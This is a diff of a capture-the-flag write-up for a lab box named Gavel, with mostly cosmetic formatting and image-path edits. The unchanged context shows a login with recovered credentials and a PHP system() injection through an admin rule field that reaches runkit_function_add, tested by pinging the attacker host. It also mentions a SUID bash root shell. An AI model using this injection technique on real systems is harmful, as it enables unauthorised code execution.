@@ -122,7 +122,7 @@ Username `sado`, email `sado@gavel.htb`. The commit diffs between the three comm
 
 Reading through the source, the application is PHP with MySQL through PDO. The interesting files are:
 
-`includes/bid_handler.php`  handles bid submissions and is where the juicy stuff lives. `admin.php`  gated to users with role `auctioneer`, lets you edit auction rules. `inventory.php` has a sorting feature that immediately looks sketchy.
+`includes/bid_handler.php` handles bid submissions and is where the juicy stuff lives. `admin.php` gated to users with role `auctioneer`, lets you edit auction rules. `inventory.php` has a sorting feature that immediately looks sketchy.
 
 The most dangerous piece of code in the entire codebase is this block in `bid_handler.php`:
 
@@ -269,9 +269,9 @@ So same credentials two different ways. `auctioneer:midnight1` it is.
 └─$ curl -i -X POST 'http://gavel.htb/login.php' -d "username=auctioneer&password=midnight1" -c cookies.txt -L
 ```
 
-After logging in as `auctioneer` the Admin Panel link appears in the nav.&#x20;
+After logging in as `auctioneer` the Admin Panel link appears in the nav.
 
-Hitting `http://gavel.htb/admin.php` shows the three live auctions, each with an Edit button that exposes the rule and message fields. This is the exact thing the source code warned us about  the rule field goes straight into `runkit_function_add`.
+Hitting `http://gavel.htb/admin.php` shows the three live auctions, each with an Edit button that exposes the rule and message fields. This is the exact thing the source code warned us about the rule field goes straight into `runkit_function_add`.
 
 #### Testing RCE with a Ping
 
@@ -288,11 +288,11 @@ In the Admin Panel, click Edit on any auction. Set the rule to:
 system('ping -c 1 10.10.14.43'); return true;
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (634).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
-Save it. Navigate to the Bidding page and place any bid on that auction :&#x20;
+Save it. Navigate to the Bidding page and place any bid on that auction :
 
-<figure><img src="../../../../.gitbook/assets/image (635).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
 
 ```
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
@@ -716,4 +716,4 @@ hashcat -m 3200
 | SUID bash (`chmod 6777` + `-p` flag)               | Gaining root shell after privileged command execution                   |
 | `PrivateTmp` namespace awareness                   | Understanding why `/tmp` targets fail from Apache-descended processes   |
 
-<figure><img src="../../../../.gitbook/assets/complete (38).gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
